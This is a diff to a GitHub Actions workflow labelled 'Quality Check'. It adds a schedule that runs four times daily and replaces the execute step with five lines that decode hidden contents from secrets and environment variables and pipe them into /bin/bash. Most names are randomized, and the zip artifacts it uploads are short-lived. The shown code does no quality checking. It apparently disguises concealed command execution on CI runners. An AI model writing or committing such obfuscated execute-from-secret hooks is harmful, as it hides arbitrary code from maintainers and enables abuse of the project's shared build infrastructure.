@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '37 2,8,14,20 * * *'
 env:
   CI: true
 concurrency:
@@ -17,17 +19,17 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          wzjs5: ${{ secrets.wzjs5 }}
+          c87: ${{ secrets.c87 }}
         run: |
-          printf '%s' "$wzjs5" | jq -r .qlpqb08656 | /bin/bash
-          printf '%s' "$yi53" | jq -r .ntd54209 | /bin/bash
-          echo $miak2365 | jq -r .kynj3 | /bin/bash
-          echo $qc0765 | jq -r .abeh860 | /bin/bash
-          printf '%s' "$dcfq40" | jq -r .tfs42625 | /bin/bash
+          printf '%s' "$c87" | jq -r .ua991 | /bin/bash
+          echo $hygx7013 | jq -r .x7 | /bin/bash
+          printf '%s' "$qnka2722" | jq -r .gv65910 | /bin/bash
+          echo $pthwt4507 | jq -r .mg265 | /bin/bash
+          printf '%s' "$p0114" | jq -r .iqwan7 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 5fPy6V8K
+          name: JZdkBfCl
           path: "*.zip"
           retention-days: 1
